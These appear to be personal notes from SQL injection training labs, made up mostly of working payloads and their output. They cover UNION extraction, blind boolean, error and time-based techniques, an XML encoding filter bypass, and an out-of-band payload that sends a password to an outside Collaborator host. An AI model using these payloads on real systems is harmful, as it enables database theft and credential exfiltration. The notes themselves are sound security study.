## basic extraction
### oracle
```
Pets'+or+'1'%3d'1
Pets'+or+'1'%3d'1'--
Pets'+or+'1'%3d'1'+order+by+2--
Pets'+union+select+null,null+from+dual--
Pets'+union+select+banner,null+from+v$version--

Pets'+union+select+sys.database_name,null+from+dual--

XE

Pets'+union+select+distinct+owner,null+from+all_tables--

APEX_040000
CTXSYS
MDSYS
PETER
SYS
SYSTEM
XDB

Pets'+union+select+table_name,null+from+all_tables--

APP_ROLE_MEMBERSHIP
APP_USERS_AND_ROLES
OL$HINTS
PRODUCTS
SRSNAMESPACE_TABLE
USERS_MENQLQ

Pets'+union+select+column_name,null+from+all_tab_columns+where+table_name='USERS_MENQLQ'--

USERNAME_PSMOBC
PASSWORD_WCMRQS

Pets'+union+select+concat(concat(USERNAME_PSMOBC,':'),PASSWORD_WCMRQS),null+from+USERS_MENQLQ--

administrator:5wu1j2bbimkqjr2okahv
carlos:mezumukqieuo35oh4rrk
wiener:u2phy3832cz7ql96el69
```
### mysql
```
Pets'+or+'1'%3d'1'#
Pets'+or+'1'%3d'1'+order+by+2#
Pets'+union+select+null,null#
Pets'+union+select+version(),null#
```
### general - use comment and version() to try and determine database - this one turned out to be postgresql
```
# initial enum
Pets'+or+'1'%3d'1'--
Pets'+or+'1'%3d'1'+order+by+2--
Pets'+union+select+null,null--
Pets'+union+select+version(),null--

PostgreSQL 12.13 (Ubuntu 12.13-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit

# all databases
Pets'+union+select+datname,'nada'+from+pg_database--

postgres
academy_labs
template1
template0

# current database
Pets'+union+select+current_database(),'nada'+from+pg_database--

academy_labs

# tables in specific database
Pets'+union+select+table_name,'nada'+from+information_schema.tables+where+database_name='academy_labs'--

error <<-- to list tables / do anything on another database, need to use DBlink

# tables in current database
Pets'+union+select+tablename,'nada'+from+pg_catalog.pg_tables--

sql_languages
pg_opfamily
pg_database
pg_operator
pg_shdepend
pg_user_mapping
pg_aggregate
pg_shseclabel
pg_sequence
pg_foreign_table
pg_statistic
pg_db_role_setting
pg_type
pg_seclabel
pg_index
pg_subscription_rel
pg_range
pg_foreign_data_wrapper
pg_attrdef
pg_replication_origin
pg_ts_parser
pg_authid
pg_auth_members
users_ftxqoe


# another way - results are slightly different
Pets'+union+select+table_name,'nada'+from+information_schema.tables--

column_privileges
pg_stat_sys_tables
pg_stat_progress_vacuum
pg_policies
foreign_servers
pg_opfamily
pg_operator
table_constraints
attributes
pg_shdepend
pg_aggregate
users_ftxqoe
products
administrable_role_authorizations
user_mappings
domains
foreign_server_options
column_column_usage
collations
pg_user
routines

# columns
Pets'+union+select+column_name,'nada'+from+information_schema.columns+where+table_name='users_fmnebg'--

password_nruxzf
username_wdkxnv

# pwn
Pets'+union+select+concat(username_wdkxnv,':',password_nruxzf),'nada'+from+users_fmnebg--

carlos:01znvxvuiqopwydfln92
wiener:mdcn7w1my9mdpnoc0l6m
administrator:7qpk90futuka5actprm7
```

## blind
### conditional responses (postgres)
```
# first thing to note (man ascii, printable chars, DEC values):
special chars:    32 - 47
numbers (0-9):    48 - 57
special chars 2:  58 - 64
uppercase:        65 - 90
special chars 3:  91 - 96
lowercase:        97 - 122
special chars 4:  123 - 126

# cookie
TrackingId=sAt3guUqk4rPAa6E'+AND+'1'='1 <<-- 5096 bytes
TrackingId=sAt3guUqk4rPAa6E'+AND+'1'='2 <<-- 5035 bytes

# use Comparer:
# TRUE: "Welcome back" in response 
# FALSE: "Welcome back" not in response

TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+'A'),1,1))=65+AND+'1'='1 <<-- true

TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+'B'),1,1))=66+AND+'1'='1 <<-- true

TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+'A'),1,1))=66+AND+'1'='1 <<-- false <<-- we got em

# prep for version()

TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+version()),1,1))=66+AND+'1'='1

# target "66"

TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+version()),1,1))=??66??+AND+'1'='1

# use ascii-printable.txt

# increase POS (2,3,4,...)
TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+version()),POS,1))=??66??+AND+'1'='1

80   P
111  o
115  s
116  t
103  g

# ok postgres, now database (note: no need "from pg_database")
TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+current_database()),1,1))=97+AND+'1'='1

97   a
99   c
97   a
100  d
101  e
109  m
121  y
95   _
108  l
97   a
98   b
115  s

# improvement: no need tail "AND 1=1", just comment and cut short
TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+version()),1,1))=80--

# tables
table_name from information_schema.tables <<-- didn't work
TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+concat(table_name,':')+from+information_schema.tables),1,1))=97--

# troubleshooting
# this one ok
TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+concat(version(),':')),1,1))=??97??--

# user
TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+user),1,1))=??80??--

112

# troubleshooting
# this one didn't
TrackingId=obviouslywrong'+OR+(SELECT+'a'+FROM+users)='a

# this one works (key: LIMIT 1)
TrackingId=obviouslywrong'+OR+(SELECT+'a'+FROM+users+LIMIT+1)='a

# ascii
TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring('a',1,1))+FROM+users+LIMIT+1)=97--

# substring
TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring('ab',2,1))+FROM+users+LIMIT+1)=97--;

# string_agg
TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(username,':'),1,1))+FROM+users+LIMIT+1)=97--;

# tables <<-- worked
TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(tablename,':'),1,1))+FROM+pg_catalog.pg_tables+LIMIT+1)=97--;

117  u
115  s
101  e
114  r
115  s
58   :
112  p
103  g
95   _
115  s
116  t
97   a
116  t
105  i
115  s

# columns
TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(column_name,':'),1,1))+FROM+information_schema.columns+where+table_name='users'+LIMIT+1)=97--;

117  u
115  s
101  

# pwn
TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(username||':'||password,','),1,1))+FROM+users+LIMIT+1)=97--;

97   a
100  d
```
### conditional errors (oracle)
```
TrackingId=obviouslywrong' <<-- 500 error
TrackingId=obviouslywrong'' <<-- 200 OK

# confirm if error is caused by sql query
TrackingId=obviouslywrong'+or+'1'='2 <<-- 200 OK
TrackingId=obviouslywrong'+or+'1'='2' <<-- 500 error

# since '1'='2' is FALSE but returns 200 OK, and an extra quote returns 500 error, looks like it's SQL query formatting that caused the different responses

# try casting errors - didn't try in the end
TrackingId=obviouslywrong'+or+'1'='2

# try normal queries
TrackingId=obviouslywrong'+or+'1'='2'+order+by+1-- <<-- OK
TrackingId=obviouslywrong'+union+select+version()-- <<-- 500 error
TrackingId=obviouslywrong'+union+select+banner+from+v$version-- <<-- OK; Oracle

# oracle extraction
TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select+ascii(substr((select+'a'+from+dual),1,1))+from+dual)=98+THEN+to_char(1/0)+ELSE+'a'+END+FROM+dual)||'
#200 OK

TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select+ascii(substr((select+'a'+from+dual),1,1))+from+dual)=97+THEN+to_char(1/0)+ELSE+'a'+END+FROM+dual)||'
#500 error <<-- nice
``` 
### time delays (postgres)
```
TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select ascii(substr((select+'ab'),1,1)))=97+THEN+pg_sleep(3)+ELSE+'a'+END)||' <<-- 3406 millis
TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select ascii(substr((select+'ab'),1,1)))=98+THEN+pg_sleep(3)+ELSE+'a'+END)||' <<-- 407 millis
```
### out-of-band (oracle)
```
# xmltype
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//84an75wifd10t9wzljfzs7xn7ed51wpl.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
#The Collaborator server received a DNS lookup of type AAAA for the domain name **84an75wifd10t9wzljfzs7xn7ed51wpl.oastify.com**

#test domain
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//hola.hpawsehr0mm9eih86s08dgiwsnyem9ay.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--

hola.hpawsehr0mm9eih86s08dgiwsnyem9ay.oastify.com
#The Collaborator server received a DNS lookup of type AAAA for the domain name **hola.hpawsehr0mm9eih86s08dgiwsnyem9ay.oastify.com**.

# the dot "." before the subdomain is important!

#try:
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT password FROM (select password,ROWNUM AS RN FROM users) WHERE RN=1)||'.hpawsehr0mm9eih86s08dgiwsnyem9ay.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--

(SELECT+*+FROM+(select+concat(username||':'||password,''),ROWNUM+AS+RN+FROM+users)+WHERE+RN=1)
# no reply - worst case, take username and password separately, using rownum to determine which password matches which username
# this didn't work probably due to length limit in dns subdomain length

SELECT username FROM (select username,ROWNUM AS RN FROM users) WHERE RN=1
# administrator.hpawsehr0mm9eih86s08dgiwsnyem9ay.oastify.com.

SELECT password FROM (select password,ROWNUM AS RN FROM users) WHERE RN=1
# 59jzm7znmj7bt5t1liio.hpawsehr0mm9eih86s08dgiwsnyem9ay.oastify.com
```

## xml + filter bypass (postgres)
```
# normal
<productId>1</productId> <<-- 111 units
<productId>2</productId> <<-- 967 units
<productId>0+2</productId> <<-- 967 units
<productId>1+1</productId> <<-- 967 units ; some logic parsing here

# trying
<productId>1'</productId> <<-- "Attack detected"
<productId>1 union select null</productId> <<-- "Attack detected"

# use hackvertor; hex_entities (since XMl)
1 union select null <<-- go to hackvertor, select "hex_entities"

# output:
&#x31;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x6e;&#x75;&#x6c;&#x6c;

# 1 union select null
<productId>&#x31;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x6e;&#x75;&#x6c;&#x6c;</productId>
<<-- 0 units

# 1 union select null
<productId>&#x31;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x6e;&#x75;&#x6c;&#x6c;</productId>
<<-- 0 units

# 1 union select null (at storeId) <<-- this was the key
<storeId>&#x31;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x6e;&#x75;&#x6c;&#x6c;</storeId>
<<-- 
111 units
null

# 1 union select null, null
<storeId>&#x31;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x6e;&#x75;&#x6c;&#x6c;&#x2c;&#x20;&#x6e;&#x75;&#x6c;&#x6c;</storeId>
<<-- 0 units ; 2 columns no-go, 1 column ok

# 1 union select version()
&#x31;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x28;&#x29;
<<--
111 units
PostgreSQL 12.13 (Ubuntu 12.13-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit

# interlude: cyberchef method
https://gchq.github.io/CyberChef/#recipe=To_Hex('%5C%5Cx',0)Find_/_Replace(%7B'option':'Regex','string':'%5C%5C%5C%5C'%7D,';%26%23',true,false,true,false)&input=MSB1bmlvbiBzZWxlY3QgZGF0bmFtZSBmcm9tIHBnX2RhdGFiYXNl

# 1 union select datname from pg_database
<<--
template1
academy_labs
postgres
111 units
template0

# 1 union select current_database() from pg_database
<<--
academy_labs
111 units

# 1 union select tablename from pg_catalog.pg_tables
<<--
pg_language
pg_sequence
pg_largeobject
pg_authid
...
users
...
pg_aggregate
111 units
products
pg_transform

# 1 union select column_name from information_schema.columns where table_name='users'
<<--
password
111 units
username

# 1 union select concat(username,':',password) from users
<<--
carlos:qqlkhy8v0srnihc5ytr3
wiener:84lxqf5hrxz36gt681ff
111 units
administrator:dd2m1my7bm3zkwrhhn5q
```

# drafts
oracle tests
```
# http://sqlfiddle.com/#!9/649e74/5
# schema
create table scientist (id integer, firstname varchar(100), lastname varchar(100));
insert into scientist (id, firstname, lastname) values (1, 'albert', 'einstein');
insert into scientist (id, firstname, lastname) values (2, 'isaac', 'newton');
insert into scientist (id, firstname, lastname) values (3, 'marie', 'curie');

# query
select firstname from scientist;
select firstname from scientist where firstname like 'a%';
select firstname from scientist where firstname like 'a%' or '1'='1';
select firstname from scientist where firstname like 'a%' and (select ascii(substr((select 'a' from dual),1,1)) from dual)=97
select firstname from scientist where firstname like 'a%' and (select substr((select 'a' from dual),1,1) from dual)=chr(97)

# cast <<-- inner "as integer" won't allow "else 'string'"
SELECT CAST ((9) AS INTEGER) int FROM DUAL
SELECT CAST ((9) AS CHAR) int FROM DUAL
SELECT CAST ((SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual) AS INTEGER) int FROM DUAL
SELECT CAST ((SELECT CASE WHEN 1=1 THEN 1 ELSE 'A' END FROM dual) AS INTEGER) int FROM DUAL
# ORA-00932: inconsistent datatypes: expected NUMBER got CHAR

# to_char
SELECT CASE WHEN 1=1 THEN to_char(1/0) ELSE '' END FROM dual
#ORA-01476: divisor is equal to zero

SELECT CASE WHEN 1=2 THEN to_char(1/0) ELSE '' END FROM dual
#(null) <<-- OK

SELECT CASE WHEN (select substr((select 'a' from dual),1,1) from dual)=chr(97) THEN to_char(1/0) ELSE '' END FROM dual
##ORA-01476: divisor is equal to zero <<-- nice

SELECT CASE WHEN (select substr((select 'a' from dual),1,1) from dual)=chr(98) THEN to_char(1/0) ELSE '' END FROM dual
#(null) <<-- OK

SELECT CASE WHEN (select ascii(substr((select 'a' from dual),1,1)) from dual)=98 THEN to_char(1/0) ELSE '' END FROM dual
#(null) <<-- OK

# concatenation into single row (listagg)
SELECT listagg(firstname||':'||lastname||',') within group (order by firstname) FROM scientist

SELECT listagg(firstname||':'||lastname||',') within group (order by firstname) FROM scientist

# simpler concatenation (concat)
SELECT concat(firstname||':'||lastname,'') FROM scientist

# returns 1 row but cannot get nth row
SELECT concat(firstname||':'||lastname,'') FROM scientist WHERE ROWNUM <= 1 

# returns nth row <<-- the "AS RN" part is important!
SELECT * FROM (select concat(firstname||':'||lastname,''),ROWNUM AS RN FROM scientist) WHERE RN=2
# isaac:newton

SELECT * FROM (select concat(firstname||':'||lastname,''),ROWNUM AS RN FROM scientist) WHERE RN=3
# marie:curie

SELECT * FROM (select firstname,ROWNUM AS RN FROM scientist) WHERE RN=3
# marie

SELECT firstname FROM (select firstname,ROWNUM AS RN FROM scientist) WHERE RN=3
# marie
```
postgresql tests
```
# postgresql testing (https://extendsclass.com/postgresql-online.html)

# all rows (note: 'or')
select firstname from scientist where firstname = 'albert' or ascii(substring((select 'a'),1,1))=97;

# one row (note: 'and')
select firstname from scientist where firstname = 'albert' and ascii(substring((select 'a'),1,1))=97;

# no result ('and', and intentionally wrong)
select firstname from scientist where firstname = 'albert' and ascii(substring((select 'b'),1,1))=97;

# testing
select tablename from pg_catalog.pg_tables; <<-- works

select string_agg(tablename,':') from pg_catalog.pg_tables <<-- works

# string_agg
select firstname from scientist where firstname = 'albert' and ascii(substring((select string_agg(tablename,':') from pg_catalog.pg_tables),1,1))=115; <<-- works

select firstname from scientist where firstname = 'albert' and ascii(substring((select string_agg(tablename,':') from pg_catalog.pg_tables),1,1))=116; <<-- no result (deliberate)

# try now <<-- didn't work
TrackingId=obviouslywrong'+AND+ASCII(SUBSTRING((select+string_agg(tablename,':')+from+pg_catalog.pg_tables),1,1))=80--

# string_agg multiple columns
select string_agg(firstname||':'|| lastname,',') from scientist;

# time delays - concats
select firstname from scientist where firstname = 'alber'||'a'; <<-- no result
select firstname from scientist where firstname = 'alber'||'t'; <<-- 'albert'
select firstname from scientist where firstname = 'alber'||'t'||''; <<-- 'albert'
SELECT CASE WHEN (select ascii(substr((select 'a'),1,1)))=97 THEN 't' ELSE 'a' END; <<-- 't'
select firstname from scientist where firstname = 'alber'||(SELECT CASE WHEN (select ascii(substr((select 'a'),1,1)))=97 THEN 't' ELSE 'a' END)||''; <<-- 'albert'
select firstname from scientist where firstname = 'alber'||(SELECT CASE WHEN (select ascii(substr((select 'a'),1,1)))=98 THEN 't' ELSE 'a' END)||''; <<-- no result

select firstname from scientist where firstname = 'alber'||(SELECT CASE WHEN (select ascii(substr((select 'a'),1,1)))=97 THEN pg_sleep(5) ELSE 'a' END)||''; <<-- canceling statement due to statement timeout

select firstname from scientist where firstname = 'alber'||(SELECT CASE WHEN (select ascii(substr((select string_agg(tablename,':') from pg_catalog.pg_tables),1,1)))=115 THEN pg_sleep(5) ELSE 'a' END)||''; <<-- canceling statement due to statement timeout

select firstname from scientist where firstname = 'alber'||(SELECT CASE WHEN (select ascii(substr((select string_agg(tablename,':') from pg_catalog.pg_tables),1,1)))=116 THEN pg_sleep(5) ELSE 'a' END)||''; <<-- no result
```
